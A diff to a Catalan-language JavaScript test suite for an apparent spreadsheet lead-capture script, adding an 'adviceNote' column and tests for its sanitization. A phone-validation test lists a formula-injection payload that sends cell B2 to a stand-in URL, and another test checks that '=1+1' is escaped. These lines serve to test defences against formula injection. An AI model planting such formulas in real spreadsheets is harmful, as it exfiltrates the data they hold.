@@ -310,10 +310,25 @@ test('telèfon: format «+prefix número»; un valor que sembla fórmula o no en
   for (const bad of ['=IMAGE("https://x/?"&B2)', '@SUM(A1)', '600000000', '+34', 'abc']) assert.equal(phone(bad), null, bad);
 });
 
-test('«visit» és l\'última columna de Leads: les anteriors no es mouen', () => {
+test('«adviceNote» és l\'última columna de Leads: les anteriors (fins a «visit») no es mouen', () => {
   const { api } = load();
-  assert.equal(api.COLUMNS.at(-1), 'visit');
-  assert.deepEqual([api.COLUMNS.indexOf('city'), api.COLUMNS.indexOf('comments'), api.COLUMNS.indexOf('visit')], [24, 25, 26]);
+  assert.equal(api.COLUMNS.at(-1), 'adviceNote');
+  assert.deepEqual([api.COLUMNS.indexOf('city'), api.COLUMNS.indexOf('comments'), api.COLUMNS.indexOf('visit'), api.COLUMNS.indexOf('adviceNote')], [24, 25, 26, 27]);
+});
+test('adviceNote: només amb «asesoramiento» al producte, retallat a 500, mai un objecte; sense el camp, buit', () => {
+  const { api } = load();
+  const lead = (patch) => api.sanitizeLead({ ...complete, contact: { ...contact, ...patch } });
+  assert.equal(lead({ product: 'asesoramiento', adviceNote: '  Vull assessorament  ' }).adviceNote, 'Vull assessorament');
+  assert.equal(Array.from(lead({ product: 'asesoramiento', adviceNote: '😀'.repeat(600) }).adviceNote).length, 500);
+  assert.equal(lead({ product: 'sifly', adviceNote: 'x' }).adviceNote, '');
+  assert.equal(lead({ product: 'asesoramiento' }).adviceNote, '');
+  assert.equal(lead({ product: 'asesoramiento', adviceNote: { a: 1 } }).adviceNote, '');
+});
+test('adviceNote amb «=» es protegeix a la fila i el parcial (step1) també el porta', () => {
+  const { api, sheet } = load();
+  api.ensureHeader(sheet, api.COLUMNS);
+  api.upsertLead(sheet, api.sanitizeLead({ ...step1, contact: { ...contact, product: 'asesoramiento', adviceNote: '=1+1' } }), '2026-11-17T10:00:00Z');
+  assert.equal(sheet.rows[1][api.COLUMNS.indexOf('adviceNote')], "'=1+1");
 });
 test('la visita del lead es desa si té format d\'id i, si no, queda buida (mai una fórmula)', () => {
   const { api } = load();
@@ -338,19 +353,19 @@ test('upsert desa la visita a la fila i un final posterior la conserva', () => {
   assert.equal(sheet.rows[1][api.COLUMNS.indexOf('visit')], 'visit-0001');
 });
 
-test('un full nou només té 26 columnes (A–Z): l\'script n\'amplia la quadrícula abans d\'escriure la capçalera de 27', () => {
+test('un full nou només té 26 columnes (A–Z): l\'script n\'amplia la quadrícula abans d\'escriure la capçalera de 28', () => {
   const { api, sheet } = load();
   assert.equal(sheet.getMaxColumns(), 26);
   api.ensureHeader(sheet, api.COLUMNS);
   assert.ok(sheet.getMaxColumns() >= api.COLUMNS.length);
-  assert.equal(sheet.rows[0].at(-1), 'visit');
+  assert.equal(sheet.rows[0].at(-1), 'adviceNote');
 });
-test('amb un full de 26 columnes, un lead nou s\'escriu sencer (27 columnes) i el POST respon ok', () => {
+test('amb un full de 26 columnes, un lead nou s\'escriu sencer (28 columnes) i el POST respon ok', () => {
   const { sheet, api } = load();
   const reply = post(api, { ...complete, contact: { ...contact, visit: 'visit-0001' } });
   assert.deepEqual(reply, { ok: true, result: 'created' });
   assert.equal(sheet.rows[1].length, api.COLUMNS.length);
-  assert.equal(sheet.rows[1].at(-1), 'visit-0001');
+  assert.equal(sheet.rows[1][api.COLUMNS.indexOf('visit')], 'visit-0001');
 });
 
 test('amb fórmules que omplen el full fins a la fila 1000 a la dreta de les dades, un lead nou es desa just sota l\'últim lead (no sota la fila 1000)', () => {
